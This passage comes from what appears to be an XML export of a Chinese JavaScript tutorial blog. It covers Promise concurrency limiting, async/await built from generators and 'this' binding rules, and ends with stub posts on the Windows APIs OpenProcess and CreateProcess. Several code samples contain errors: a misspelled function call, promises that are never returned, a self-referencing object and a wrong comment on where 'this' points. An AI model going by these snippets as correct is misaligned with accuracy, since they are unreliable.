class_">Set</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> task <span class="keyword">of</span> tasks) &#123;</span><br><span class="line">        <span class="keyword">const</span> promise = <span class="title function_">task</span>();</span><br><span class="line">        taskPool.<span class="title function_">add</span>(promise);</span><br><span class="line">        promise.<span class="title function_">then</span>(<span class="function">() =&gt;</span> taskPool.<span class="title function_">delete</span>(promise));</span><br><span class="line">        <span class="keyword">if</span> (taskPool.<span class="property">size</span> &gt;= limit) &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">race</span>(taskPool);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(taskPool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 如果存在同步任务情况</span></span><br><span class="line"><span class="comment">async function doSomething(tasks:(()=&gt;Promise&lt;void&gt;)[], limit=2) &#123;</span></span><br><span class="line"><span class="comment">    // 正在执行中的任务的集合</span></span><br><span class="line"><span class="comment">    const taskPool = new Set();</span></span><br><span class="line"><span class="comment">    for (const task of tasks) &#123;</span></span><br><span class="line"><span class="comment">        const promise = task();</span></span><br><span class="line"><span class="comment">        const p = Promise.resolve(promise)  // 包装Promise, 同步任务直接返回</span></span><br><span class="line"><span class="comment">        taskPool.add(p);</span></span><br><span class="line"><span class="comment">        promise.then(() =&gt; taskPool.delete(p));</span></span><br><span class="line"><span class="comment">        if (taskPool.size &gt;= limit) &#123;</span></span><br><span class="line"><span class="comment">            await Promise.race(taskPool);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return Promise.all(taskPool);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">doSomethin</span>(tasks).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;任务全部执行完了&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载图片</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getTasks</span>(<span class="params">urls</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> tasks = [];</span><br><span class="line">    urls.<span class="title function_">forEach</span>(<span class="function"><span class="params">url</span> =&gt;</span> &#123;</span><br><span class="line">        tasks.<span class="title function_">push</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">                img.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                img.<span class="property">src</span> = url;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> tasks;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">doSomething</span>(<span class="title function_">getTasks</span>([<span class="string">&#x27;xxxx.jpg&#x27;</span>, <span class="string">&#x27;xxxx.png&#x27;</span>])).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;全部执行完了&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 加载图片</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="视频地址"><a href="#视频地址" class="headerlink" title="视频地址"></a>视频地址</h2><div class="tag link"><a class="link-card" title="【Promise的异步任务并发限制还不会写？还只会Promise.all ？今天一次性教会你实现思路与细节！】" href="ttps://www.bilibili.com/video/BV1i24y1L72L/?share_source=copy_web&vd_source=a11f39cbd36d0048998b780fa95bc7df"><div class="left"><img src="https://gcore.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">【Promise的异步任务并发限制还不会写？还只会Promise.all ？今天一次性教会你实现思路与细节！】</p><p class="url">ttps://www.bilibili.com/video/BV1i24y1L72L/?share_source=copy_web&vd_source=a11f39cbd36d0048998b780fa95bc7df</p></div></a></div>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async/await 学习</title>
      <link href="/ca9ee217.html"/>
      <url>/ca9ee217.html</url>
      
        <content type="html"><![CDATA[<div class="note info cyan"><p><strong></strong></p><p>async 函数可能包含 0 个或者多个 <emp>await</emp> 表达式。await 表达式会暂停整个 async 函数的执行进程并出让其控制权，只有当其等待的基于 promise 的异步操作被兑现或被拒绝之后才会恢复进程。promise 的解决值会被当作该 await 表达式的返回值。使用 <emp>async&#x2F;await</emp> 关键字就可以在异步代码中使用普通的 <emp>try&#x2F;catch</emp> 代码块。</p></div><span id="more"></span><div class="note warning"><p><strong>备注</strong></p><p><emp>await</emp>关键字只在 async 函数内有效。如果你在 async 函数体之外使用它，就会抛出语法错误 <emp>SyntaxError</emp>。</p></div><div class="note warning"><p><strong>备注</strong></p><p><emp>async&#x2F;await</emp>的目的为了简化使用基于 promise 的 API 时所需的语法。<emp>async&#x2F;await</emp> 的行为就好像搭配使用了生成器和 promise。</p></div><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">request</span> (url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(url + count ++);     </span><br><span class="line">        &#125;, <span class="number">500</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用async/await语法糖</span></span><br><span class="line"><span class="comment">// async function run () &#123;</span></span><br><span class="line"><span class="comment">//     const res1 = await request(&#x27;1111&#x27;);</span></span><br><span class="line"><span class="comment">//     const res2 = await request(res1);</span></span><br><span class="line"><span class="comment">//     console.log(res2);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// run();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于生成器函数模拟async/await</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">generate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">yield</span> <span class="title function_">request</span>(<span class="string">&#x27;1111&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> res2 = <span class="keyword">yield</span> <span class="title function_">request</span>(res);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用递归实现连续调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run</span> () &#123;</span><br><span class="line">    <span class="keyword">const</span> g = <span class="title function_">generate</span>();</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exec</span> (params) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; value, done &#125; = g.<span class="title function_">next</span>();</span><br><span class="line">        <span class="keyword">if</span> (!done) &#123;</span><br><span class="line">            value.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="title function_">exec</span>(res));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">exec</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">run</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>this 指向</title>
      <link href="/6cfe1ad3.html"/>
      <url>/6cfe1ad3.html</url>
      
        <content type="html"><![CDATA[<details cyan><summary> this到底指向什么？ </summary>              <div class='content'>              <div class="note message light"><p>函数在调用时，JavaScript会默认给this绑定一个值</p></div><div class="note message light"><p>this的绑定和定义的位置（编写的位置）没有关系</p></div><div class="note message light"><p>this的绑定和调用方式以及调用的位置有关系</p></div><div class="note message light"><p>this是在运行时被绑定的</p></div>              </div>            </details><span id="more"></span><hr><h2 id="this-绑定规则"><a href="#this-绑定规则" class="headerlink" title="this 绑定规则"></a>this 绑定规则</h2><div class="note info"><p><strong>this的绑定规则</strong></p><ul><li><p class='p gray'>绑定一：默认绑定</p></li><li><p class='p gray'>绑定二：隐式绑定</p></li><li><p class='p gray'>绑定三：显示绑定</p></li><li><p class='p gray'>绑定四：new绑定</p></li></ul></div><h2 id="默认绑定"><a href="#默认绑定" class="headerlink" title="默认绑定"></a>默认绑定</h2><div class="note info"><p>独立的函数调用可以理解成函数没有被绑定到某个对象上进行调用</p></div><div class="note warning"><p>严格模式，独立调用的函数中的this指向的是undefined</p></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 普通函数被独立调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;foo &#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>();  <span class="comment">// 指向window</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 函数定义在对象中，但是独立调用</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;why&#x27;</span>,</span><br><span class="line">  <span class="attr">bar</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;bar &#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// obj.bar(); // 指向obj对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> baz = obj.<span class="property">bar</span>;</span><br><span class="line"><span class="title function_">baz</span>() <span class="comment">// 指向window</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 严格模式，独立调用的函数中的this指向的是undefined</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>()</span><br></pre></td></tr></table></figure><h4 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test1</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="title function_">test2</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test2</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="title function_">test3</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test3</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test1</span>();</span><br></pre></td></tr></table></figure><h4 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 高阶函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> (func) &#123;</span><br><span class="line">  <span class="title function_">func</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;why&#x27;</span>,</span><br><span class="line">  <span class="attr">bar</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(obj.<span class="property">bar</span>); <span class="comment">// 属于独立调用</span></span><br></pre></td></tr></table></figure><hr><h2 id="隐式绑定"><a href="#隐式绑定" class="headerlink" title="隐式绑定"></a>隐式绑定</h2><div class="note info"><p>通过某个对象进行调用；也就是它的调用位置中，是通过某个对象发起的函数调用</p></div><div class="note warning"><p><strong>隐式绑定的前提条件</strong></p><ul><li>必须<emp>在调用的对象内部有一个对函数的引用</emp>（比如一个属性）；</li><li>如果没有这样的引用，在进行调用时，会报找不到该函数的错误；</li><li>正是通过这样的引用，间接的将this绑定到这个对象上；</li></ul></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 隐式绑定</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">bar</span>: foo,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">bar</span>();  <span class="comment">// 指向obj对象</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><h4 id="案例一-1"><a href="#案例一-1" class="headerlink" title="案例一"></a>案例一</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;obj&#x27;</span>,</span><br><span class="line">  <span class="attr">foo</span>: foo,</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">const</span> obj2 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;obj2&#x27;</span>,</span><br><span class="line">  <span class="attr">obj1</span>: obj2,</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> obj2.<span class="property">obj1</span>.<span class="title function_">foo</span>(); <span class="comment">// 指向obj1对象</span></span><br></pre></td></tr></table></figure><h4 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;obj1&#x27;</span>,</span><br><span class="line">  <span class="attr">foo</span>: foo,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> bar = obj1.<span class="property">foo</span>;</span><br><span class="line"><span class="title function_">bar</span>();  <span class="comment">// 指向obj1对象</span></span><br></pre></td></tr></table></figure><hr><h2 id="显式绑定"><a href="#显式绑定" class="headerlink" title="显式绑定"></a>显式绑定</h2><div class="note info"><p>不希望在对象内部包含这个函数的引用，同时又希望在这个对象上进行强制调用；可以使用显式绑定</p></div><div class="note success"><p><strong>call和apply方法</strong></p><ul><li>第一个参数是相同的，要求传入一个对象<ul><li><u>这个对象的作用就是给this准备的</u></li><li><u>在调用这个函数时，会将this绑定到这个传入的对象上</u></li></ul></li><li>后面的参数；apply为数组，call为参数列表</li></ul></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> (name, age, height) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;foo 函数被调用 &#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;打印参数 &#x27;</span>, name, age, height);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ()调用</span></span><br><span class="line"><span class="comment">// foo(&#x27;why&#x27;, 18, 180);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// apply</span></span><br><span class="line"><span class="comment">// 第一个参数：绑定this</span></span><br><span class="line"><span class="comment">// 第二个参数：传入额外的实参，以数组的形式</span></span><br><span class="line"><span class="comment">// foo.apply(&#x27;apply&#x27;, [&#x27;kobe&#x27;, 30, 198])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// call</span></span><br><span class="line"><span class="comment">// 第一个参数：绑定this</span></span><br><span class="line"><span class="comment">// 第二个参数：后续的参数以多参数的形式传递，会作为实参</span></span><br><span class="line">foo.<span class="title function_">call</span>(<span class="string">&#x27;call&#x27;</span>, <span class="string">&#x27;james&#x27;</span>, <span class="number">35</span>, <span class="number">205</span>);</span><br></pre></td></tr></table></figure><h3 id="bind-的显示绑定"><a href="#bind-的显示绑定" class="headerlink" title="bind 的显示绑定"></a>bind 的显示绑定</h3><div class="note info"><p><strong></strong></p><ul><li>如果我们希望一个函数总是显式的绑定到一个对象上，可以使用 bind 方法；bind()方法创建一个新的<emp>绑定函数(bound function, BF)</emp></li><li>绑定函数是一个<emp>exotic function object(怪异函数对象，ECMAScript 2015 中的术语)</emp></li><li>在bind() 被调用时，这个新函数的this被指定为bind() 的第一个参数，而其余参数将作为新函数的参数，供调用时使用</li></ul></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> (name, age, height) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;foo &#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123; <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;why&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需求：调用foo时，总是绑定到obj对象身上（不希望obj对象上有函数）</span></span><br><span class="line"><span class="comment">// 1. bind函数的基本使用</span></span><br><span class="line"><span class="keyword">const</span> bar = foo.<span class="title function_">bind</span>(obj);</span><br><span class="line"><span class="title function_">bar</span>();  <span class="comment">// this --&gt; obj</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. bind函数的其他参数</span></span><br><span class="line"><span class="keyword">const</span> test = foo.<span class="title function_">bind</span>(obj, <span class="string">&#x27;kobe&#x27;</span>, <span class="number">30</span>, <span class="number">198</span>)</span><br><span class="line"><span class="title function_">test</span>() </span><br></pre></td></tr></table></figure><hr><h2 id="new绑定"><a href="#new绑定" class="headerlink" title="new绑定"></a>new绑定</h2><div class="note info"><p>JavaScript中的函数可以当做一个类的构造函数来使用，也就是使用new关键字</p></div><div class="note success"><p><strong>使用new关键字调用函数执行的操作</strong></p><ol><li>创建新的空对象；</li><li>新对象会被执行prototype连接；</li><li>新对象会绑定到函数调用的this上（this绑定在这个步骤完成）；</li><li>没有显示返回非空对象时，默认返回这个对象；</li></ol></div><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span> () &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;why&#x27;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title function_">foo</span>();  <span class="comment">// 指向foo对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Person</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span> (name) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);  <span class="comment">// Person &#123;&#125;</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;   <span class="comment">// Person &#123; name: &#x27;why&#x27; &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;why&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br></pre></td></tr></table></figure><hr><h2 id="内置函数的调用绑定"><a href="#内置函数的调用绑定" class="headerlink" title="内置函数的调用绑定"></a>内置函数的调用绑定</h2>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenProcess</title>
      <link href="/59bbde9c.html"/>
      <url>/59bbde9c.html</url>
      
        <content type="html"><![CDATA[<p>openProcess</p><span id="more"></span><p>openProcess 释义</p>]]></content>
      
      
      <categories>
          
          <category> Windows API </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CreateProcess</title>
      <link href="/e0165a92.html"/>
      <url>/e0165a92.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>CreateProcess</strong></p><p>创建一个新进程及主线程。新进程在调用进程的安全上下文中运行;</p></div><span id="more"></span><h2 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ LPSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPSTARTUPINFOA lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateProcessW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    